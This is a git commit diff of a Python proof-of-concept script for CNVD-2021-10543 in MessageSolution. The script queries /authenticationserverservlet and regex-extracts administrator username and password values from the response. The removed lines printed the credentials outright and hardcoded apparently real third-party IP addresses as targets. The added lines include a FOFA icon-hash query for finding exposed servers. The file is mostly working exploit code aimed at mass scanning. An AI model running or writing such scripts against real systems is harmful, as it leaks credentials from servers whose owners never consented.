ba3fa79e1519945bd2511ad4e741d857e6a27f80
securitysqs <66762242+securitysqs@users.noreply.github.com>
2022-03-30 18:02:29 +0800

    Update CNVD-2021-10543-MessageSolution_infomation_flow.py

--- 2021/CNVD-2021-10543-MessageSolution_infomation_flow.py
+++ 2021/CNVD-2021-10543-MessageSolution_infomation_flow.py
@@ -7,65 +7,48 @@ import os
 import re
 
 def title():
-    print('+ 使用格式: python3 CNVD-2021-10543-MessageSolution_infomation_flow  192.168.1.1:80')
-def run_https(ip, port):
-    url = 'https://{}:{}/authenticationserverservlet'.format(ip, port)
-    referer = 'http://{}:{}/indexcommon.jsp'.format(ip, port)
+    print('+          FOFA: icon_hash="-320896955"')
+    
+def run_proto(url):
+    url = url + '/authenticationserverservlet'
+    referer = url + '/indexcommon.jsp'
     header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
               'Referer': referer,
-              'Origin': 'http://41.193.41.242:7777',
-              'Content-Type': 'application/x-www-form-urlencoded',
-              'Host': '41.193.41.242:7777'
+              'Content-Type': 'application/x-www-form-urlencoded'
               }
     try:
         requests.packages.urllib3.disable_warnings()
-        req = requests.get(url=url, headers=header, verify=False, timeout=3)
-        if req.status_code == 200 and 'administrator' in req.text:
-            username = re.search('<username>(.*?)</username>', req.text).group(1)
-            password = re.search('<password>(.*?)</password>', req.text).group(1)
-            print('https')
-            print(username)
-            print(password)
+        resp = requests.get(url=url, headers=header, verify=False, timeout=(3, 3))
+        reContent = re.search('<username>.*?</username>', resp.text, re.I | re.M)
+        if reContent and resp.status_code == 200:
+            print(reContent)
             return True
         else:
             return False
     except Exception as e:
         return False
-
+    
+    
 def run(ip, port):
-    url = 'http://{}:{}/authenticationserverservlet'.format(ip, port)
-    referer = 'http://{}:{}/indexcommon.jsp'.format(ip, port)
-    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
-              'Referer': referer,
-              'Origin': 'http://41.193.41.242:7777',
-              'Content-Type': 'application/x-www-form-urlencoded',
-              'Host': '41.193.41.242:7777'
-              }
-    try:
-        requests.packages.urllib3.disable_warnings()
-        req = requests.get(url=url, headers=header, timeout=3)
-        if req.status_code == 200 and 'administrator' in req.text:
-            username = re.search('<username>(.*?)</username>', req.text).group(1)
-            password = re.search('<password>(.*?)</password>', req.text).group(1)
-            print('http')
-            print(username)
-            print(password)
+    i = 0
+    proto = ['http', 'https']
+    while i < 2:
+        url = '{}://{}:{}'.format(proto[i], ip, port)
+        if run_proto(url):
             return True
         else:
-            return run_https(ip, port)
-    except Exception as e:
-        return run_https(ip, port)
+            i = i + 1
+            
+            
 if __name__ == '__main__':
     title()
-    #target = '41.193.41.242:7777'
-    #target = '59.107.27.184:443'
     target = sys.argv[1]
     ip = target.split(':')[0]
-    port = int(target.split(':')[1])
+    port = target.split(':')[1]
 
     result = run(ip, port)
 
     if result:
-        print("Exist")
+        print('Exist')
     else:
-        print("UnExist")
+        print('UnExist')
